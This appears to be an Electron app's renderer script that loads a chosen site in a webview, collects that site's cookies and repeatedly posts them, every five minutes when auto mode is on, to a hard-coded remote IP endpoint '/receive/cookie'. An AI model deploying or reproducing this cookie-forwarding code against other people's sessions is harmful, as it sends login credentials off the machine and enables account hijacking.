/*
 * @Author: tushan
 * @Date: 2022-12-14 21:13:56
 * @LastEditors: tushan
 * @LastEditTime: 2022-12-15 18:27:58
 * @Description: 
 */
const { ipcRenderer, ipcMain } = require("electron");
const Qs = require('qs')
const getCookie = () => {
  url = document.querySelector(".view").src;
  let a = document.createElement("a")
  a.href = url;
  ipcRenderer.send("getCookie", {
    domain: a.hostname.replace("www.", '')
  })
}
ipcRenderer.on("message", function (event, data) {
  let str = ""
  data.forEach(element => {
    str += '; ' + element.name + '=' + element.value;
  });

  str = str.slice(2)
  var axios_instance = axios.create({
    baseURL: 'http://173.0.57.133:8866',
    transformRequest: [function (data) {
      data = Qs.stringify(data);
      return data;
    }],
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
  })
  axios_instance.post('/receive/cookie', {
    cookies: str
  }).then(el => {
    console.log(el);
  })
})


document.querySelector("#getCookie").onclick = getCookie
document.querySelector("#refresh").onclick = function (params) {
  document.querySelector(".view").reload()
}
document.querySelector("#open").onclick = function (params) {
  document.querySelector(".view").src = document.querySelector("#url").value
}

let reloadAuto = false
$("#closeboot").hide()
document.querySelector("#openboot").onclick = function () {
  $("#openboot").hide()
  $("#closeboot").show()
  reloadAuto = true
  submit()
}
document.querySelector("#closeboot").onclick = function () {
  $("#openboot").show()
  $("#closeboot").hide()
  reloadAuto = false
}
setInterval(() => {
  submit()
}, 1000 * 60 * 5);
const submit = () => {
  if (reloadAuto) {
    function sub() {
      getCookie()
      document.querySelector(".view").removeEventListener("did-stop-loading", sub)
    }
    document.querySelector(".view").addEventListener("did-stop-loading", sub)
    document.querySelector(".view").reload()
  }
}